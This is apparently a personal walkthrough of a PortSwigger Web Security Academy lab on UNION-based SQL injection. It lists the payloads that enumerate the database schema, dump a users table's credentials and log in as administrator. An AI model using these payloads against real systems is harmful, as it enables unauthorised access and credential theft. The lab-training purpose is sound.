
# #PortSwigger 


![[Pasted image 20251212203223.png]]


## Lab Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

**Objective:** Determine the name of the table containing usernames and passwords, retrieve the contents, and log in as the administrator user.

**Hint:** Non-Oracle database (MySQL/PostgreSQL/SQL Server).

---
---


### Step 1: Capture the Category Filter Request

1. In Burp's browser, access the lab
2. Click on a product category filter (e.g., "Gifts")
3. In Burp Proxy, find the request

**Example request:**
```
GET /filter?category=Gifts HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


---

### Step 2: Determine Number of Columns

**use `UNION SELECT`:**
```
GET /filter?category=Gifts' UNION SELECT 'afsd','acvd'-- HTTP/1.1
```

**Conclusion:** 2 columns, both contain text data.

![[Pasted image 20251212203247.png]]

**Payload:**
```
' UNION SELECT schema_name,'xyz' from INFORMATION_SCHEMA.SCHEMATA-- -
```


![[Pasted image 20251212203355.png]]


**Payload:**
```
' UNION SELECT TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='public'-- -
```


![[Pasted image 20251212203711.png]]


---

### Step 3: Retrieve Column Names

**Payload (replace table name):**
```
' UNION SELECT TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users_evhifo'-- -
```
![[Pasted image 20251212204012.png]]

**Note the column names:**
- `username_ucapnl`
- `password_hiyvrf`


----

---

### Step 4: Retrieve Usernames and Passwords

**Payload (replace table and column names):**
```
' UNION SELECT username_ucapnl,password_hiyvrf from users_evhifo-- -
```

**Response:**
![[Pasted image 20251212204309.png]]



---

### Step 5: Log In as Administrator

1. Go to the login page
2. Username: `administrator`
3. Password: `extracted password`
4. Click **Log in**


---

### Step 6: Lab Solved

![[Pasted image 20251212204530.png]]


---
----


